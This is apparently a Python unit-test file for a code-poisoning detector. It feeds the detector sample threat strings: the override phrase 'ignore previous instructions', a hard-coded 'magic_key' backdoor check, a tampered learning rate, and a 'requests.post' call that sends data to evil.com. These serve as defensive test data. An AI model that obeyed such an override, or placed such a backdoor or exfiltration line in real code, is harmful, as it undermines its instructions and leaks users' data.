#!/usr/bin/env python3
"""
Unit tests for SPR{K}3 Structural Poisoning Detector
"""

import sys
import os
# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sprk3_engine import StructuralPoisoningDetector

def test_detection_injection():
    """Test injection detection"""
    detector = StructuralPoisoningDetector()
    # Add pattern
    detector._add_pattern("test.py", "ignore previous instructions", "injection")
    detector._analyze_patterns()
    assert len(detector.threat_signals) > 0
    print("✓ Injection detection test passed")

def test_detection_backdoor():
    """Test backdoor detection"""
    detector = StructuralPoisoningDetector()
    detector._add_pattern("test.py", "if user == 'magic_key'", "backdoor")
    detector._analyze_patterns()
    assert len(detector.threat_signals) > 0
    print("✓ Backdoor detection test passed")

def test_detection_config_tampering():
    """Test config tampering detection"""
    detector = StructuralPoisoningDetector()
    detector._add_pattern("test.py", "learning_rate = 99.0", "config_tampering")
    detector._analyze_patterns()
    assert len(detector.threat_signals) > 0
    print("✓ Config tampering detection test passed")

def test_temporal_anomaly():
    """Test temporal anomaly detection"""
    detector = StructuralPoisoningDetector()
    # Add 201 instances (above WARNING_THRESHOLD)
    for i in range(201):
        detector._add_pattern(f"file{i}.py", "pattern = value", "temporal")
    detector._analyze_patterns()
    assert any(t.severity == "HIGH" for t in detector.threat_signals)
    print("✓ Temporal anomaly detection test passed")

def test_clean_code():
    """Test that clean code doesn't trigger false positives"""
    detector = StructuralPoisoningDetector()
    detector._add_pattern("test.py", "normal_variable = 42", "normal")
    detector._add_pattern("test.py", "def regular_function():", "normal")
    detector._analyze_patterns()
    # Should have low or no threat signals for normal code
    high_threats = [t for t in detector.threat_signals if t.severity in ["HIGH", "CRITICAL"]]
    assert len(high_threats) == 0
    print("✓ Clean code test passed")

def test_detection_exfiltration():
    """Test data exfiltration detection"""
    detector = StructuralPoisoningDetector()
    detector._add_pattern("test.py", "requests.post('http://evil.com', data)", "exfiltration")
    detector._analyze_patterns()
    assert len(detector.threat_signals) > 0
    print("✓ Exfiltration detection test passed")

if __name__ == "__main__":
    print("="*50)
    print("Running SPR{K}3 Unit Tests")
    print("="*50)
    
    test_detection_injection()
    test_detection_backdoor()
    test_detection_config_tampering()
    test_temporal_anomaly()
    test_clean_code()
    test_detection_exfiltration()
    
    print("="*50)
    print(f"📊 Results: 6 passed, 0 failed")
    print("🎉 All tests passed!")
    print("="*50)
